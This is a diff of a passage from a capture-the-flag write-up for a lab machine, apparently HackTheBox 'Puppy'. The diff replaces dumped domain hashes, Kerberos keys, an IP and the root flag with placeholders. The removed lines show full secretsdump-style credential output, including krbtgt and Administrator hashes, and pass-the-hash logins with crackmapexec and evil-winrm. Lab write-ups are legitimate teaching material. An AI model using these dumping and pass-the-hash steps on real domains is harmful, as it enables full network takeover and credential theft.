 [*] Starting service RemoteRegistry
 [*] Target system bootKey: 0xa943f13896e3e21f6c4100c7da9895a6
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:9c541c389e2904b9b112f599fd6b333d:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
-[*] Dumping cached domain logon information (domain/username:hash)
-[*] Dumping LSA Secrets
-[*] $MACHINE.ACC 
-PUPPY\DC$:aes256-cts-hmac-sha1-96:f4f395e28f0933cac28e02947bc68ee11b744ee32b6452dbf795d9ec85ebda45
-PUPPY\DC$:aes128-cts-hmac-sha1-96:4d596c7c83be8cd71563307e496d8c30
-PUPPY\DC$:des-cbc-md5:54e9a11619f8b9b5
-PUPPY\DC$:plain_password_hex:84880c04e892448b6419dda6b840df09465ffda259692f44c2b3598d8f6b9bc1b0bc37b17528d18a1e10704932997674cbe6b89fd8256d5dfeaa306dc59f15c1834c9ddd333af63b249952730bf256c3afb34a9cc54320960e7b3783746ffa1a1528c77faa352a82c13d7c762c34c6f95b4bbe04f9db6164929f9df32b953f0b419fbec89e2ecb268ddcccb4324a969a1997ae3c375cc865772baa8c249589e1757c7c36a47775d2fc39e566483d0fcd48e29e6a384dc668228186a2196e48c7d1a8dbe6b52fc2e1392eb92d100c46277e1b2f43d5f2b188728a3e6e5f03582a9632da8acfc4d992899f3b64fe120e13
-PUPPY\DC$:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
-[*] DPAPI_SYSTEM 
-dpapi_machinekey:0xc21ea457ed3d6fd425344b3a5ca40769f14296a3
-dpapi_userkey:0xcb6a80b44ae9bdd7f368fb674498d265d50e29bf
-[*] NL$KM 
- 0000   DD 1B A5 A0 33 E7 A0 56  1C 3F C3 F5 86 31 BA 09   ....3..V.?...1..
- 0010   1A C4 D4 6A 3C 2A FA 15  26 06 3B 93 E0 66 0F 7A   ...j<*..&.;..f.z
- 0020   02 9A C7 2E 52 79 C1 57  D9 0C D3 F6 17 79 EF 3F   ....Ry.W.....y.?
- 0030   75 88 A3 99 C7 E0 2B 27  56 95 5C 6B 85 81 D0 ED   u.....+'V.\k....
-NL$KM:dd1ba5a033e7a0561c3fc3f58631ba091ac4d46a3c2afa1526063b93e0660f7a029ac72e5279c157d90cd3f61779ef3f7588a399c7e02b2756955c6b8581d0ed
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::
+<SNIP>
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a4f2989236a639ef3f766e5fe1aad94a:::
-PUPPY.HTB\levi.james:1103:aad3b435b51404eeaad3b435b51404ee:ff4269fdf7e4a3093995466570f435b8:::
-PUPPY.HTB\ant.edwards:1104:aad3b435b51404eeaad3b435b51404ee:afac881b79a524c8e99d2b34f438058b:::
-PUPPY.HTB\adam.silver:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
-PUPPY.HTB\jamie.williams:1106:aad3b435b51404eeaad3b435b51404ee:bd0b8a08abd5a98a213fc8e3c7fca780:::
-PUPPY.HTB\steph.cooper:1107:aad3b435b51404eeaad3b435b51404ee:b261b5f931285ce8ea01a8613f09200b:::
-PUPPY.HTB\steph.cooper_adm:1111:aad3b435b51404eeaad3b435b51404ee:ccb206409049bc53502039b80f3f1173:::
-DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::
+<SNIP>
 [*] Kerberos keys grabbed
-Administrator:aes256-cts-hmac-sha1-96:c0b23d37b5ad3de31aed317bf6c6fd1f338d9479def408543b85bac046c596c0
-Administrator:aes128-cts-hmac-sha1-96:2c74b6df3ba6e461c9d24b5f41f56daf
-Administrator:des-cbc-md5:20b9e03d6720150d
-krbtgt:aes256-cts-hmac-sha1-96:f2443b54aed754917fd1ec5717483d3423849b252599e59b95dfdcc92c40fa45
-krbtgt:aes128-cts-hmac-sha1-96:60aab26300cc6610a05389181e034851
-krbtgt:des-cbc-md5:5876d051f78faeba
-PUPPY.HTB\levi.james:aes256-cts-hmac-sha1-96:2aad43325912bdca0c831d3878f399959f7101bcbc411ce204c37d585a6417ec
-PUPPY.HTB\levi.james:aes128-cts-hmac-sha1-96:661e02379737be19b5dfbe50d91c4d2f
-PUPPY.HTB\levi.james:des-cbc-md5:efa8c2feb5cb6da8
-PUPPY.HTB\ant.edwards:aes256-cts-hmac-sha1-96:107f81d00866d69d0ce9fd16925616f6e5389984190191e9cac127e19f9b70fc
-PUPPY.HTB\ant.edwards:aes128-cts-hmac-sha1-96:a13be6182dc211e18e4c3d658a872182
-PUPPY.HTB\ant.edwards:des-cbc-md5:835826ef57bafbc8
-PUPPY.HTB\adam.silver:aes256-cts-hmac-sha1-96:670a9fa0ec042b57b354f0898b3c48a7c79a46cde51c1b3bce9afab118e569e6
-PUPPY.HTB\adam.silver:aes128-cts-hmac-sha1-96:5d2351baba71061f5a43951462ffe726
-PUPPY.HTB\adam.silver:des-cbc-md5:643d0ba43d54025e
-PUPPY.HTB\jamie.williams:aes256-cts-hmac-sha1-96:aeddbae75942e03ac9bfe92a05350718b251924e33c3f59fdc183e5a175f5fb2
-PUPPY.HTB\jamie.williams:aes128-cts-hmac-sha1-96:d9ac02e25df9500db67a629c3e5070a4
-PUPPY.HTB\jamie.williams:des-cbc-md5:cb5840dc1667b615
-PUPPY.HTB\steph.cooper:aes256-cts-hmac-sha1-96:799a0ea110f0ecda2569f6237cabd54e06a748c493568f4940f4c1790a11a6aa
-PUPPY.HTB\steph.cooper:aes128-cts-hmac-sha1-96:cdd9ceb5fcd1696ba523306f41a7b93e
-PUPPY.HTB\steph.cooper:des-cbc-md5:d35dfda40d38529b
-PUPPY.HTB\steph.cooper_adm:aes256-cts-hmac-sha1-96:a3b657486c089233675e53e7e498c213dc5872d79468fff14f9481eccfc05ad9
-PUPPY.HTB\steph.cooper_adm:aes128-cts-hmac-sha1-96:c23de8b49b6de2fc5496361e4048cf62
-PUPPY.HTB\steph.cooper_adm:des-cbc-md5:6231015d381ab691
-DC$:aes256-cts-hmac-sha1-96:f4f395e28f0933cac28e02947bc68ee11b744ee32b6452dbf795d9ec85ebda45
-DC$:aes128-cts-hmac-sha1-96:4d596c7c83be8cd71563307e496d8c30
-DC$:des-cbc-md5:7f044607a8dc9710
+Administrator:aes256-cts-hmac-sha1-96:<SNIP>
+Administrator:aes128-cts-hmac-sha1-96:<SNIP>
+Administrator:des-cbc-md5:<SNIP>
+<SNIP>
 ```
 
 ```bash
-└─$ sudo crackmapexec winrm 10.10.11.70 -u 'Administrator' -H 'bb0edc15e49ceb4120c7bd7e6e65d75b' -d PUPPY.HTB
-HTTP        10.10.11.70     5985   10.10.11.70      [*] http://10.10.11.70:5985/wsman
+└─$ sudo crackmapexec winrm 10.10.xx.xx -u 'Administrator' -H '<SNIP>' -d PUPPY.HTB
+HTTP        10.10.xx.xx     5985   10.10.xx.xx      [*] http://10.10.xx.xx:5985/wsman
 /usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
   arc4 = algorithms.ARC4(self._key)
-WINRM       10.10.11.70     5985   10.10.11.70      [+] PUPPY.HTB\Administrator:bb0edc15e49ceb4120c7bd7e6e65d75b (Pwn3d!)
+WINRM       10.10.xx.xx     5985   10.10.xx.xx      [+] PUPPY.HTB\Administrator:<SNIP> (Pwn3d!)
 ```
 
 &rarr; We can access the machine as `Administrator` account.
 
 ```
-└─$ evil-winrm -i 10.10.11.70 -u 'Administrator' -H 'bb0edc15e49ceb4120c7bd7e6e65d75b'
+└─$ evil-winrm -i 10.10.xx.xx -u 'Administrator' -H '<SNIP>'
                                         
 Evil-WinRM shell v3.7
                                         
@@ -891,7 +841,7 @@ Mode                 LastWriteTime         Length Name
 
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
-7c4823ac2b5271a922127c1f128d4df6
+7c4823xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 &rarr; Found the `root.txt` flag.
